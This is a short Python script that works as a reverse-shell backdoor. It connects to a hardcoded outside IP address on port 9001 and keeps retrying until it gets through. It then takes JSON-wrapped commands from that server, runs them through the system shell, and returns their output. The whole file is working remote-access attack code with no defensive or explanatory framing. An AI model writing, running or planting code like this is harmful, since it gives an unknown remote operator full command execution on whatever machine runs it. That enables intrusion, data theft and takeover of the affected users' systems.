import socket
import subprocess
import json
import time

SERVER_IP = "158.255.6.84"
PORT = 9001


def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, PORT))
            print("[+] Connected to server")
            return s
        except:
            time.sleep(5)


def execute(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output

    return output.decode()


def main():
    s = connect()

    while True:
        try:
            data = s.recv(4096)
            if not data:
                s = connect()
                continue

            message = json.loads(data.decode())
            cmd = message["cmd"]

            output = execute(cmd)

            response = json.dumps({"output": output})
            s.send(response.encode())

        except:
            s = connect()


if __name__ == "__main__":
    main()
